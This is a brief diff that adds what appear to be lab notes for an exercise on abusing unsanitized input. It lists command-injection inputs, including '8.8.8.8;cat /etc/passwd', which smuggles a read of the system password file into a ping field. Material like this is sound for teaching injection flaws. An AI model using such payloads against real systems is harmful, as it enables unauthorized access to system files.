@@ -1,0 +1,7 @@
+Activity 2.6.1 - Abusing Unsanitized Input
+
+ifconfig
+ping 8.8.8.8;ping 4.2.2.2
+cat /etc/passwd
+
+8.8.8.8;cat /etc/passwd
